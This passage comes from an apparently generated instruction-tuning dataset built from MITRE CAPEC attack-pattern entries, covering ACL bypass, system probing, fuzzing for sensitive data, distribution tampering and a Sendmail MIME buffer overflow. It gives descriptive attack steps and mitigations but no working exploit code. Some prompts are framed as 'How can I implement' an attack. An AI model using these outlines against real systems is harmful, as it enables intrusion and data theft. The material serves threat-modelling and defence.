          "xhtml:p": "Configuration management servers operate on the basis of a client pool, instructing each client on which software to install. In some cases the configuration management server will automate the software installation process. A malicious insider or an adversary who has compromised the server can alter the software baseline that clients must install, allowing the adversary to compromise a large number of satellite machines using the configuration management system. If an adversary can control elements of a product's configuration management for its deployed environment they can potentially alter fundamental security properties of the system based on assumptions that secure configurations are in place. It is also worth noting that this attack can occur during initial product development or throughout a product's sustainment."
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "444",
            "Exclude_Related": {
              "@Exclude_ID": "515"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": "Access to the configuration management system during deployment or currently deployed at a victim location. This access is often obtained via insider access or by leveraging another attack pattern to gain permissions that the adversary wouldn't normally have."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Authorization",
            "Impact": "Execute Unauthorized Commands"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Assess software during development and prior to deployment to ensure that it functions as intended and without any malicious functionality.",
            "Leverage anti-virus products to detect and quarantine software with known virus."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "In 2016, the policy-based configuration management system Chef was shown to be vulnerable to remote code execution attacks based on its Chef Manage add-on improperly deserializing user-driven cookie data. This allowed unauthenticated users the ability to craft cookie data that executed arbitrary code with the web server's privileges. [REF-706]"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.001",
            "Entry_Name": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-379"
            },
            {
              "@External_Reference_ID": "REF-706"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Example_Instances, Extended_Description, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Description, Extended_Description, Related_Attack_Patterns, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Manipulation During Distribution (CAPEC ID: 439)",
    "context": "",
    "output": "Examples of Manipulation During Distribution (CAPEC ID: 439) are: A malicious OEM provider, or OEM provider employee or contractor, may install software, or modify existing code, during distribution.\n* External contractors involved in the packaging or testing of products or components may install software, or modify existing code, during distribution.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A malicious OEM provider, or OEM provider employee or contractor, may install software, or modify existing code, during distribution.",
        "External contractors involved in the packaging or testing of products or components may install software, or modify existing code, during distribution."
      ],
      "@Name": "Manipulation During Distribution (CAPEC ID: 439)",
      "attack_ptrn": {
        "@ID": "439",
        "@Name": "Manipulation During Distribution",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attacker undermines the integrity of a product, software, or technology at some stage of the distribution channel. The core threat of modification or manipulation during distribution arise from the many stages of distribution, as a product may traverse multiple suppliers and integrators as the final asset is delivered. Components and services provided from a manufacturer to a supplier may be tampered with during integration or packaging.",
        "Example_Instances": {
          "Example": [
            "A malicious OEM provider, or OEM provider employee or contractor, may install software, or modify existing code, during distribution.",
            "External contractors involved in the packaging or testing of products or components may install software, or modify existing code, during distribution."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1269"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195",
            "Entry_Name": "Supply Chain Compromise"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-379"
            },
            {
              "@External_Reference_ID": "REF-384"
            },
            {
              "@External_Reference_ID": "REF-382",
              "@Section": "Section 1. Introduction"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Integrity Modification During Distribution"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Accessing Functionality Not Properly Constrained by ACLs (CAPEC ID: 1)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: Implementing the Model-View-Controller (MVC) within Java EE's Servlet paradigm using a \"Single front controller\" pattern that demands that brokered HTTP requests be authenticated before hand-offs to other Action Servlets.\n* If no security-constraint is placed on those Action Servlets, such that positively no one can access them, the front controller can be subverted.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Implementing the Model-View-Controller (MVC) within Java EE's Servlet paradigm using a \"Single front controller\" pattern that demands that brokered HTTP requests be authenticated before hand-offs to other Action Servlets.",
        "If no security-constraint is placed on those Action Servlets, such that positively no one can access them, the front controller can be subverted."
      ],
      "@Name": "Accessing Functionality Not Properly Constrained by ACLs (CAPEC ID: 1)",
      "attack_ptrn": {
        "@ID": "1",
        "@Name": "Accessing Functionality Not Properly Constrained by ACLs",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "122"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "17"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey] The attacker surveys the target application, possibly as a valid and authenticated user",
              "Technique": [
                "Spidering web sites for all available links",
                "Brute force guessing of resource names",
                "Brute force guessing of user names / credentials",
                "Brute force guessing of function names / actions"
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Identify Functionality] At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actions",
              "Technique": [
                "Use the web inventory of all forms and inputs and apply attack data to those inputs.",
                "Use a packet sniffer to capture and record network traffic",
                "Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Iterate over access capabilities] Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.",
              "Technique": "Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.",
            "The various resources, or individual URLs, must be somehow discoverable by the attacker",
            "The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Confidentiality",
              "Access Control",
              "Authorization"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": {
            "xhtml:p": [
              "In a J2EE setting, administrators can associate a role that is impossible for the authenticator to grant users, such as \"NoAccess\", with all Servlets to which access is guarded by a limited number of servlets visible to, and accessible by, the user.",
              "Having done so, any direct access to those protected Servlets will be prohibited by the web container.",
              "In a more general setting, the administrator must mark every resource besides the ones supposed to be exposed to the user as accessible by a role impossible for the user to assume. The default security setting must be to deny access and then grant access only to those resources intended by business logic."
            ]
          }
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Implementing the Model-View-Controller (MVC) within Java EE's Servlet paradigm using a \"Single front controller\" pattern that demands that brokered HTTP requests be authenticated before hand-offs to other Action Servlets.",
              "If no security-constraint is placed on those Action Servlets, such that positively no one can access them, the front controller can be subverted."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "276"
            },
            {
              "@CWE_ID": "285"
            },
            {
              "@CWE_ID": "434"
            },
            {
              "@CWE_ID": "693"
            },
            {
              "@CWE_ID": "732"
            },
            {
              "@CWE_ID": "1191"
            },
            {
              "@CWE_ID": "1193"
            },
            {
              "@CWE_ID": "1220"
            },
            {
              "@CWE_ID": "1297"
            },
            {
              "@CWE_ID": "1311"
            },
            {
              "@CWE_ID": "1314"
            },
            {
              "@CWE_ID": "1315"
            },
            {
              "@CWE_ID": "1318"
            },
            {
              "@CWE_ID": "1320"
            },
            {
              "@CWE_ID": "1321"
            },
            {
              "@CWE_ID": "1327"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1574.010",
            "Entry_Name": "Hijack Execution Flow: ServicesFile Permissions Weakness"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Attack_Pattern, References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Pattern, Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Related_Weaknesses, Skills_Required, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Query System for Information (CAPEC ID: 54)",
    "context": "",
    "output": "Examples of Query System for Information (CAPEC ID: 54) are: Blind SQL injection is an example of this technique, applied to successful exploit. See also: CVE-2006-4705",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Blind SQL injection is an example of this technique, applied to successful exploit. See also: CVE-2006-4705"
      ],
      "@Name": "Query System for Information (CAPEC ID: 54)",
      "attack_ptrn": {
        "@ID": "54",
        "@Name": "Query System for Information",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Low",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "116",
            "Exclude_Related": [
              {
                "@Exclude_ID": "514"
              },
              {
                "@Exclude_ID": "515"
              },
              {
                "@Exclude_ID": "437"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine parameters] Determine all user-controllable parameters of the application either by probing or by finding documentation"
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Cause error condition] Inject each parameter with content that causes an error condition to manifest"
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Modify parameters] Modify the content of each parameter according to observed error conditions"
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Follow up attack] Once the above steps have been repeated with enough parameters, the application will be sufficiently mapped out. The adversary can then launch a desired attack (for example, Blind SQL Injection)"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "This class of attacks does not strictly require authorized access to the application. As Attackers use this attack process to classify, map, and identify vulnerable aspects of an application, it simply requires hypotheses to be verified, interaction with the application, and time to conduct trial-and-error activities."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Although fuzzing parameters is not difficult, and often possible with automated fuzzers, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design."
          }
        },
        "Resources_Required": {
          "Resource": {
            "xhtml:p": [
              "The Attacker needs the ability to probe application functionality and provide it erroneous directives or data without triggering intrusion detection schemes or making enough of an impact on application logging that steps are taken against the adversary.",
              "The Attack does not need special hardware, software, skills, or access."
            ]
          }
        },
        "Indicators": {
          "Indicator": "Repeated errors generated by the same piece of code are an indication, although it requires careful monitoring of the application and its associated error logs, if any."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Confidentiality",
            "Impact": "Read Data"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Application designers can construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are cataloged and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.",
            "Application designers can wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion."
          ]
        },
        "Example_Instances": {
          "Example": [
            "Blind SQL injection is an example of this technique, applied to successful exploit. See also: CVE-2006-4705",
            {
              "xhtml:p": [
                "Attacker sends bad data at various servlets in a J2EE system, records returned exception stack traces, and maps application functionality.",
                "In addition, this technique allows attackers to correlate those servlets used with the underlying open source packages (and potentially version numbers) that provide them."
              ]
            }
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "209"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Description Summary"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated References"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-11-09",
            "#text": "Probe Application Error Reporting"
          }
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Fuzzing for garnering other adjacent user/sensitive data (CAPEC ID: 261)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries.",
      "@Name": "Fuzzing for garnering other adjacent user/sensitive data (CAPEC ID: 261)",
      "attack_ptrn": {
        "@ID": "261",
        "@Name": "Fuzzing for garnering other adjacent user/sensitive data",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary who is authorized to send queries to a target sends variants of expected queries in the hope that these modified queries might return information (directly or indirectly through error logs) beyond what the expected set of queries should provide.",
        "Extended_Description": {
          "xhtml:p": "Many client applications use specific query templates when interacting with a server and often automatically fill in specific fields or attributes. If the server does not verify that the query matches one of the expected templates, an adversary who is allowed to send normal queries could modify their query to try to return additional information. The adversary may not know the names of fields to request or how other modifications will affect the server response, but by attempting multiple plausible variants, they might eventually trigger a server response that divulges sensitive information. Other possible outcomes include server crashes and resource consumption if the unexpected queries cause the server to enter an unstable state or perform excessive computation."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "54"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Observe communication and inputs] The fuzzing adversary observes the target system looking for inputs and communications between modules, subsystems, or systems.",
              "Technique": [
                "Network sniffing. Using a network sniffer such as wireshark, the adversary observes communications into and out of the target system.",
                "Monitor API execution. Using a tool such as ktrace, strace, APISpy, or another debugging tool, the adversary observes the system calls and API calls that are made by the target system, and the nature of their parameters.",
                "Observe inputs using web inspection tools (OWASP's WebScarab, Paros, TamperData, TamperIE, etc.)"
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.",
              "Technique": [
                "Boundary cases. Generate fuzz inputs that attack boundary cases of protocol fields, inputs, or other communications limits. Examples include 0xff and 0x00 for single-byte inputs. In binary situations, approach each bit of an individual field with on and off (e.g., 0x80).",
                "Attempt arguments to system calls or APIs. The variations include payloads that, if they were successful, could lead to a compromise on the system."
              ]
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Observe the outcome] Observe the outputs to the inputs fed into the system by fuzzers and see if there are any log or error messages that either provide user/sensitive data or give information about an expected template that could be used to produce this data."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Craft exploit payloads] If the logs did not reveal any user/sensitive data, an adversary will attempt to make the fuzzing inputs form to an expected template",
              "Technique": [
                "Create variants of expected templates that request additional information",
                "Create variants that exclude limiting clauses",
                "Create variants that alter fields taht identify the requester in order to subvert access controls",
                "Repeat different fuzzing variants until sensitive information is divulged"
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The server must assume that the queries it receives follow specific templates and/or have fields or attributes that follow specific procedures. The server must process queries that it receives without adequately checking or sanitizing queries to ensure they follow these templates."
        },
        "Resources_Required": {
          "Resource": "The attacker must have sufficient privileges to send queries to the targeted server. A normal client might limit the nature of these queries, so the attacker must either have a modified client or their own application which allows them to modify the expected queries."
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "A client that queries an employee database might have templates such that the user only supplies the target's name and the template dictates the fields to be returned (location, position in the company, phone number, etc.). If the server does not verify that the query matches one of the expected templates, an attacker who is allowed to send normal queries could modify their query to try to return additional information. For this example, additional information might include social security numbers or salaries."
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "20"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-11-09",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description, Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Description, Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'MIME Conversion (CAPEC ID: 42)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - MIME Conversion (CAPEC ID: 42) are: A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges.\n- Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "A MIME conversion buffer overflow exists in Sendmail versions 8.8.3 and 8.8.4. Sendmail versions 8.8.3 and 8.8.4 are vulnerable to a buffer overflow in the MIME handling code. By sending a message with specially-crafted headers to the server, a remote attacker can overflow a buffer and execute arbitrary commands on the system with root privileges.",
        "Sendmail performs a 7 bit to 8 bit conversion on email messages. This vulnerability is due to the fact that insufficient bounds checking was performed while performing these conversions. This gave attacker an opportunity to overwrite the internal stack of sendmail while it is executing with root privileges. An attacker first probes the target system to figure out what mail server is used on the system and what version. An attacker could then test out the exploit at their leisure on their own machine running the same version of the mail server before using it in the wild."
      ],
      "@Name": "MIME Conversion (CAPEC ID: 42)",
      "attack_ptrn": {
        "@ID": "42",
        "@Name": "MIME Conversion",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker exploits a weakness in the MIME conversion routine to cause a buffer overflow and gain control over the mail server machine. The MIME system is designed to allow various different information formats to be interpreted and sent via e-mail. Attack points exist when data are converted to MIME compatible format and back.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "100"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify target mail server] The adversary identifies a target mail server that they wish to attack.",
              "Technique": "Use Nmap on a system to identify a mail server service."
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Determine viability of attack] Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4)."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Find injection vector] Identify places in the system where vulnerable MIME conversion routines may be used."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Craft overflow content] The adversary crafts e-mail messages with special headers that will cause a buffer overflow for the vulnerable MIME conversion routine. The intent of this attack is to leverage the overflow for execution of arbitrary code and gain access to the mail server machine, so the adversary will craft an email that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversary's choosing.",
              "Technique": [
                "Create malicious shellcode that will execute when the program execution is returned to it.",
                "Use a NOP-sled in the overflow content to more easily \"slide\" into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs"
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Overflow the buffer] Send e-mail messages to the target system with specially crafted headers that trigger the buffer overflow and execute the shell code."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The target system uses a mail server.",
            "Mail server vendor has not released a patch for the MIME conversion routine, the patch itself has a security hole or does not fix the original problem, or the patch has not been applied to the user's system."
          ]
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "It may be trivial to cause a DoS via this attack pattern"
            },
            {
              "@Level": "High",
              "#text": "Causing arbitrary code to execute on the target system."
            }
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Availability",
              "Impact": "Unreliable Execution"
            },
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Stay up to date with third party vendor patches",
            {
              "xhtml:p": [
                "Disable the 7 to 8 bit conversion. This can be done by removing the F=9 flag from all Mailer specifications in the sendmail.cf file.",
                "For example, a sendmail.cf file with these changes applied should look similar to (depending on your system and configuration):",
                "This can be achieved for the \"Mlocal\" and \"Mprog\" Mailers by modifying the \".mc\" file to include the following lines:",
                "and then rebuilding the sendmail.cf file using m4(1).",
                "From \"Exploiting Software\", please see reference below."
              ],
              "xhtml:div": [
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:div": [
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:br": null,
                      "#text": "T=DNS/RFC822/X-Unix,A=mail -d $u"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:br": [
                        null,
                        null
                      ],
                      "#text": "D=$z:/,T=X-Unix,A=sh -c $u"
                    }
                  ],
                  "xhtml:br": null,
                  "#text": "Mlocal, P=/usr/libexec/mail.local, F=lsDFMAw5:/|@qrmn, S=10/30, R=20/40,\n                  Mprog, P=/bin/sh, F=lsDFMoqeu, S=10/30, R=20/40,"
                },
                {
                  "@style": "margin-left:1em;",
                  "@class": "informative",
                  "xhtml:div": [
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:br": null,
                        "#text": "`translit(LOCAL_MAILER_FLAGS, `9')',`rmn'))"
                      },
                      "#text": "ifdef(`LOCAL_MAILER_FLAGS',"
                    },
                    {
                      "@style": "margin-left:1em;",
                      "xhtml:div": {
                        "@style": "margin-left:1em;",
                        "xhtml:br": null,
                        "#text": "`translit(LOCAL_SHELL_FLAGS, `9')',`eu'))"
                      },
                      "#text": "ifdef(`LOCAL_SHELL_FLAGS',"
                    }
                  ],
                  "xhtml:br": null,
                  "#text": "define(`LOCAL_MAILER_FLAGS',\n                  define(`LOCAL_SHELL_FLAGS',"
                }
              ]
            },
            "Use the sendmail restricted shell program (smrsh)",
            "Use mail.local"
          ]
        },
        "Example_Instances": {
          "Example": {
